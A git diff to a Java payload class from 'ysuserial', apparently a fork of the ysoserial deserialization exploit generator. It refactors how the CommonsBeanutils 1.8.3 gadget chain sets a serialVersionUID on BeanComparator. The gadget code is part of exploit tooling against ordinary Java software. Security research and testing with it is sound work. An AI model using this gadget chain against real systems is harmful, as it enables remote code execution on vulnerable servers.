@@ -2,7 +2,6 @@ package org.su18.ysuserial.payloads;
 
 import javassist.ClassPool;
 import javassist.CtClass;
-import javassist.CtField;
 import org.apache.commons.beanutils.BeanComparator;
 import org.su18.ysuserial.payloads.annotation.Dependencies;
 import org.su18.ysuserial.payloads.util.Gadgets;
@@ -10,6 +9,8 @@ import org.su18.ysuserial.payloads.util.Reflections;
 
 
 import java.util.PriorityQueue;
+
+import static org.su18.ysuserial.payloads.util.Gadgets.insertField;
 
 @SuppressWarnings({"rawtypes", "unchecked"})
 @Dependencies({"commons-beanutils:commons-beanutils:1.8.3"})
@@ -21,8 +22,9 @@ public class CommonsBeanutils1183NOCC implements ObjectPayload<Object> {
 
 		ClassPool pool    = ClassPool.getDefault();
 		CtClass   ctClass = pool.get("org.apache.commons.beanutils.BeanComparator");
-		CtField   field   = CtField.make("private static final long serialVersionUID = -3490850999041592962L;", ctClass);
-		ctClass.addField(field);
+
+		insertField(ctClass, "serialVersionUID", "private static final long serialVersionUID = -3490850999041592962L;");
+
 		Class                       beanCompareClazz = ctClass.toClass();
 		BeanComparator              comparator       = (BeanComparator) beanCompareClazz.newInstance();
 		final PriorityQueue<Object> queue            = new PriorityQueue<Object>(2, comparator);
